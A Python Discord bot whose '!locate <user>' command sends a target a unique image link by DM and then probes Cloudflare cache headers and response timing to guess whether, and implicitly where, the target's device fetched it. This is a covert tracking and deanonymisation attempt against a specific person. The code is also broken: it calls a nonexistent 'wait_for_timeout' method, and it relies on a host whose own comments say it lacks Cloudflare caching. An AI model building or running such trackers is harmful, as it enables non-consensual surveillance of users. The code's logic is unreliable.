import discord
from discord.ext import commands
import requests
import os
import random
import string
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import time

# Get token from Railway env vars
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    raise ValueError("DISCORD_TOKEN environment variable is not set!")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Keep-alive for Railway
def keep_alive():
    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    print("Keeping alive...")
    server.serve_forever()

p = threading.Thread(target=keep_alive)
p.start()

@bot.event
async def on_ready():
    print(f'Bot ready! Logged in as {bot.user}')
    await bot.change_presence(activity=discord.Game(name="!locate <user>"))

@bot.command()
async def locate(ctx, user: discord.User):
    # 1. Generate a unique ID
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    # 2. Create a unique image URL using Discord's CDN structure
    # We'll use a public image and append a query param to bypass cache
    # Using a reliable image source that supports CORS and headers
    base_url = "https://i.imgur.com/placeholder.png" # Replace with a real small image URL
    # Let's use a real small image to ensure it loads
    img_url = f"https://httpbin.org/image/png?r={random_id}" 
    
    # Download and set avatar
    try:
        resp = requests.get(img_url)
        if resp.status_code == 200:
            await ctx.bot.user.edit(avatar=resp.content)
            print(f"Avatar set to: {img_url}")
        else:
            await ctx.send("Failed to download image.")
            return
    except Exception as e:
        await ctx.send(f"Error setting avatar: {e}")
        return

    # 3. Send DM
    try:
        await user.send(f"Test Image: {img_url}") # Include URL so they know what to look for
        await ctx.send(f"Sent DM to {user.name}. Waiting...")
    except discord.Forbidden:
        await ctx.send(f"Cannot DM {user.name}.")
        return

    # 4. Wait for device to process
    # Increase wait time to 20 seconds to be safe
    await ctx.send("Waiting 20 seconds for device to fetch asset...")
    await bot.wait_for_timeout(20)

    # 5. Probe Cache Status
    headers = {'User-Agent': 'Mozilla/5.0'}
    
    try:
        # Check if our server sees a HIT
        # Note: httpbin.org does NOT use Cloudflare cache status in the same way.
        # So we switch to a better method: Check if the URL returns 200 quickly.
        
        start_time = time.time()
        probe_resp = requests.head(img_url, headers=headers, timeout=5)
        elapsed = time.time() - start_time
        
        # If it's a HIT, the response should be extremely fast (< 0.5s)
        # If MISS, it might take longer depending on origin
        
        if probe_resp.status_code == 200:
            # Check for CF-Cache-Status if available
            cf_status = probe_resp.headers.get('cf-cache-status', 'Unknown')
            
            if cf_status == 'HIT':
                await ctx.send(f"✅ **Cloudflare Cache HIT!** ({cf_status})")
                await ctx.send(f"This suggests the asset was served from edge cache, possibly triggered by your push.")
            elif cf_status == 'MISS':
                await ctx.send(f"❌ **Cloudflare Cache MISS.** ({cf_status})")
                await ctx.send("The target likely did not fetch the asset yet, or their device isn't caching it.")
            else:
                await ctx.send(f"⚠️ **No CF Cache Header.** Response Time: {elapsed:.2f}s")
                await ctx.send("Fast response might indicate a local cache, but not definitive.")
                
        else:
            await ctx.send(f"❌ Failed to probe image. Status: {probe_resp.status_code}")

    except Exception as e:
        await ctx.send(f"Error probing: {e}")

bot.run(TOKEN)